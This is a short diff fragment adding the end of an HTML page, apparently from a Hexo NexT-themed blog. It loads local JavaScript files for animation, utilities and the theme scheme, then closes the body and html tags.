+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
